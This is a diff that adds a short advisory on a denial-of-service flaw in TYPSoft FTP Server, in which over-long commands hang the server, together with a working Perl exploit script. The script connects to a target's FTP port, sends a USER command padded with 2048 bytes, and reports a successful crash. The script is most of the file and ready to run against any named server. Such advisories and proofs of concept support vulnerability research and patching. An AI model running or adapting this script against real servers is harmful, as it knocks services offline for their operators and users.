@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/1690/info
+
+Long commands (ie., over 2048 bytes) sent to TYPSoft FTP Server cab cause the server to hang, requiring a manual restart to restore the process.
+
+After the release of this advisory Noam Rathaus from http://www.BeyondSecurity.com contributed the following addendum:
+
+.. "this product is also vulnerable if you connect to the server, but not send anything (do the SYN/ACK sequence but disconnect immediately). This is due to the fact that they use a DELPHI TSocket class, which doesn't handle exceptions very well. " 
+
+#!/usr/bin/perl
+use Getopt::Std;
+use IO::Socket;
+getopts('s:', \%args);
+if(!defined($args{s})){&usage;}
+$serv = $args{s};
+$foo = "A"; $number = 2048;
+$data .= $foo x $number; $EOL="\015\012";
+$remote = IO::Socket::INET->new(
+Proto => "tcp",
+PeerAddr => $args{s},
+PeerPort => "ftp(21)",
+) || die("Unable to connect to ftp port at $args{s}\n");
+$remote->autoflush(1);
+print $remote "USER $data". $EOL;
+while (<$remote>){ print }
+print("\nCrash was successful !\n");
+
+sub usage {die("\n$0 -s <server>\n\n");}
